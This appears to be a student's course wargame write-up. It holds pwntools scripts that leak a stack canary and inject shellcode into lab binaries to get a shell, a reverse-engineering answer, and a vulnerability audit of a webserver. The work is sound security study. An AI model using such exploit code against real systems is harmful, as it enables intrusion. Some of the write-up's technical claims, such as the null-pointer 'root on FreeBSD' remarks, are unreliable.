# z5214048
## (Rev 3)
### Submitted before the end of the Friday!

shellcrack
=========================== 
Flag: COMP6447{study_for_midsem_it's_on_monday}

General overview of problems faced 
------------------------------------- 
## Awesome skills obtained:
* Can finally operate gdb!
* Found an amazing tool for quick maths called "SpeedCrunch"
* Learnt to use "pwnlib.util.packing.fit" instead of ~~brain~~ maths skillz

## Had to hack the program 
1. "file shellcrack"
```
ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=1a53a0aa62ea610a06b85b6ba388ff2ea4fe1a9d, not stripped
```

2. Ida Free on "shellcrack"
* no win() 
* gets() -> yo
* check_canary() -> canary present


3. GDB
* 3.1 analyse what happens to be the vuln's "ret" address in stack
```
00:0000│ esp  0xffffd524 —▸ 0x565558a4 (main+18) ◂— mov    eax, 0
00:0000│ esp  0xffffd524 —▸ 0x565558a4 (main+18) ◂— mov    eax, 0
00:0000│ esp  0xffffd524 —▸ 0x565558a4 (main+18) ◂— mov    eax, 0


"Write your data to the buffer[0xffffd4dc]."
"Write your data to the buffer[0xffffd4dc]."
```

* 3.2 GDB disables randomisation: Turning that off...

**OLD**
```
"Write your data to the buffer[0xffffd4dc]."
00:0000│ esp  0xffffd524 —▸ 0x565558a4 (main+18) ◂— mov    eax, 0
hex(0xffffd524 - 0xffffd4dc) = 0x48
```
**NEW**
```
Write your data to the buffer[0xffbeda4c].
00:0000│ esp  0xffbeda94 —▸ 0x566448a4 (main+18) ◂— mov    eax, 0
hex(0xffbeda94-0xffbeda4c)= 0x48
```

4. GDB again. Find addresses and the offsets against one another: {gets() buffer, canary, ret} -> same as step 3 (too lazy to write novels)
5. Write script

Script/Command used 
------------------ 
``` 
#!/usr/bin/python2



from pwn import *
import time

PROGRAM_NAME = "shellcrack"
ENCODING = "ascii"
MAGIC_CHAR = 'Z'

# config local stuff
context.binary = './shellcrack'

def io_beg():
	return remote('plzpwn.me', 5001)
	#process("./shellcrack")
	#remote('plzpwn.me', 2000)
	
def io_rdy(x):
	x.recvuntil("Enter as", timeout = 3)
	x.recvline()
	return 1


# https://stackoverflow.com/a/3368991
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""


def main():	
	# due to  madjick,
	# this script works (253/256)^9 * 100 percent of times which is ok I hope


	# usage
	# 1. place in the same dir as shellcrack
	# 2. work

	context.binary = "./shellcrack"
	
	fin = 0
	stage = 0
	
	# https://github.com/Gallopsled/pwntools/issues/1048#issuecomment-335915889
	shell = pwnlib.shellcraft.sh()
	shell_asm = asm(shell)
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()						
			io_rdy(io)
			
			# interesting len1 values (dec)
			# * 16 (first leak)
			# * 63 (last non affecting canary)
			# * 64 (canary set to '' (NULL byte)
			len1 = 16
			print("len 1: "+str(len1))
			pay1 = MAGIC_CHAR*len1
			io.send(pay1)			
			print("pay 1 done")
			stage = stage + 1
		elif(stage == 1):
			# CANARY
			## skip
			io.recvuntil("This is the 6447 wargaming gateway,")
			
			## new leak
			canary1 = io.recvline().strip()
			
			## get leaked canary
			canary2 = find_between_r(canary1, MAGIC_CHAR, "!")
			print("*Gotten canary! Len: "+str(len(canary2))+" ["+canary2+"]")
		
			# LEAK (stack)
			leak1 = io.recvuntil("Write your data to the buffer", timeout=2)
			
			## [0xDEADFBEEF]
			leak2 = io.recvline()
			
			## 0xDEADFBEEF
			leak2 = find_between(leak2, "[", "]")
			print("*Gotten leak at "+leak2)
			
			# FINALISE
			canary = canary2 # BIN
			leak = leak2 # number in hex

			# 214756469 bla bla
			leak_int = int(leak, 16)

			stage = stage + 1
		elif(stage == 2):
			
			pay2 = pwnlib.util.packing.fit(pieces = {
					0: shell_asm,
					48: canary,
					72: p32(leak_int)
				}, filler='\x90', length = 80)
			io.sendline(pay2)			
			print("[FINAL] pay 2 done")
			stage = stage + 1
		elif(stage == 3):
			print("now lets just wait for magic to happen... epic'ly")
			print("==============="+"BEG"+"===============")
			print(io.recvall(timeout = 2))
			print("==============="+"FIN"+"===============")
			
			io.interactive()
			stage = stage + 1
		else:
			print("done. Awesome!")
			fin = 1

if __name__ == '__main__':
	main()
```

Usage:
1. place in the same dir as shellcrack (for context)
2. run script. Because canary is required to have: no magic strings + no null bytes + no "!"'s chars, It will work with the ```((253/256)^9)*100%~=90%``` chance if run once (man I love maths)
3. Enjoy having hacked into, by catting the flag. So overall it is
```
python2 5001_shellcrack.py
cat /flag
```

stack-dump2
=======================
Flag: 2hard4me

General overview of problems faced 
------------------------------------- 
Had to hack the program 

## 1 file

```
./stack-dump2: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5318c4c46af9f27b0acc9cfdeb09664c4514de8a, not stripped
```

## 2 runtime

```z5214048@piano10:~/COMP6447/Wargames$ ./stack-dump2
ERROR: ld.so: object 'libgtk3-nocsd.so.0' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Lets try a real stack canary, like the ones GCC uses
But this time, lets enable ALL protections and make the stack non-executable!
To make things easier, here's a useful stack pointer 0xff965c97
a) input data
b) dump memory
c) print memory map
d) quit

c
ff947000-ff968000 rw-p 00000000 00:00 0                                  [stack]
```

## 3 - IDA reckon
* win() here
* no "gets()"


## 4 - func reckon
* D) sys exit: *(main+0x204) ->> *(main+516)
	
## 5 - Test runs
DGB. Randomisation off:
* Sys exit - stack leak = 117 DEC

## 6. Construct payload (see code) -> Fail -> What am I doing wrong?
### 6.1. I can't seem to find canary, **but is it even present in the first place?**

## P.S. initial strat:
* Get recon data (leaked addr etc)
* Overwrite the controlled string with shell getter + the return address in the end to the leaked addr
* press D to ~~pay respects~~ hope it'd jump to where I want it to jump

Script/Command used 
------------------ 
```
#!/usr/bin/python2

from pwn import *
import time

PROGRAM_NAME = "5000"

TARGET_NAME = "stack-dump2"
TARGET_NAME_DOTTED = "./"+TARGET_NAME

ENCODING = "ascii"


# config local stuff
context.binary = TARGET_NAME_DOTTED


def io_beg():
	return process(TARGET_NAME_DOTTED)
	#process("./shellcrack")
	#remote('plzpwn.me', 5000)
	#process(TARGET_NAME_DOTTED)

# useful as str
def io_useful(x):
	x.recvuntil("To make things easier, here's a useful stack pointer")
	return x.recvline().strip()

def io_rdy(x):
	x.recvuntil("quit")
	return 0

def app_impulse(x, s):
	assert("abcd".find(s) != -1)
	x.sendline(s)
	return 0
	
def app_input(x, s, l=-1):
	assert(len(s) > 0)
	
	if(l == -1):
		l = (len(s)-1)
	
	app_impulse(x,"a")
	
	# len
	x.recvuntil("len")
	x.sendline(str(l))
	
	# content/input
	x.sendline(s)
	
def app_dump(x):
	app_impulse(x,"b")
	
	# wait
	x.recvuntil("memory at ")
	
	# buf
	buf = x.recvline().strip().split(":")
	return buf
	

# https://stackoverflow.com/a/3368991
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""


def main():	

	fin = 0
	stage = 0
	
	# https://github.com/Gallopsled/pwntools/issues/1048#issuecomment-335915889
	shell = pwnlib.shellcraft.sh()
	shell_asm = asm(shell)
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()	
			
			useful = io_useful(io)
			
			print("useful: "+useful)
			useful_int = int(useful, 16)
			useful_int_p32 = p32(useful_int)
								
			io_rdy(io)
			
			pay1 = fit({40: shell_asm, 171: str(useful_int_p32)}, filler = '\x90', length = 190)
			app_input(io, pay1, 191)
			
			buf = app_dump(io)
			print("buf is: "+str(buf))
			
			app_impulse(io, "d")
			io.interactive()
			
			stage = stage + 1
		else:
			print("done. Awesome!")
			fin = 1

			
			

if __name__ == '__main__':
	main()

```

re
------------------------
 > You need to submit the most simplified version of C that would compile into the supplied assembly 
 ```
 int quick_idiv(int a, int b) { 
    return a \ b; 
}
 ```

Now the **comments**: 
* What does it do: **signed** integer division
* It's the GCC "thing" - since x86 int division is relatively slow, it tries to work around it with shifts, hacks (multiplying my multiplicative inverse of the number) and other simplifications to statistically increase the O() time. While not 100% always faster, it tends to be faster than what x86 has to offer. Similarly to, say, Karatsuba multiplication or Hamming code (credits to 3821)


 webserver.c 
 ----------------------
 Vulns 
 ## Found vulns: 13
 1+2. write_socket() & read_socket() functions in lines 16 and 37 resp. - incorrect bytes counting. Instead of adding one byte at a time, the program will add the {pointer size} many bytes every time, which will, in case of 32 bit, be 4 bytes. This vulnerability can lead to controllable data injections & leakages respectively
 3. Again, line 57. You even facilitate vuln #2, by removing the NULL terminator from being considered in the buffer
 4. Line 103: "    fclose(file);" is executed if and only if things go right. If they don't, such as in the case of line 78 if-statement. The file pointer remains present in the program which may be exploited later
 5. Lines 110 and 127. Buf's initially allocated to contain 100 chars, however later on, the 1000 of them are read, causing data leakage
 6. Lines 87-91. If x is at it's peak value of (x-1), in line 91 it may read buf[x+1], making the second if-condition either always  true or false in that case, and conversely causing a tiny mem leak (I mean, you'd leak the possible value of one unrelated byte)
 7. Lines 83, 86 and others. Incorrect maths of write_socket() may change the considered size of buf in line 86, causing memset to zero out much more data than it's supposed otherwise
 8. Line 187: writing to the pointer to sin instead of the parameter of sin. Renders sin pointer unusable later on, and creates a null-pointer, which will then be able to access root on say FreeBSD.
 9. Line 140: fopen may fail, creating a potential null-pointer, which will then be able to access root on say FreeBSD.
 10. Lines 173-176: Command not ignored. Also, no break
 11. Lines 183, 190: Ambiguous int handling. Short > (65536/2)+1 is supplied, the function errorously considers the input to be negative
 12. writing to the client struct pointer instead of the struct data. Potentially creates a null pointer which will then be able to access root on say FreeBSD.
 13. line 57: vsnprintf is fmt string vulnerable, making this line targetable for the program's arbitrary memory reads and writes, as well as the code execution. For example, from read_page() in line 113
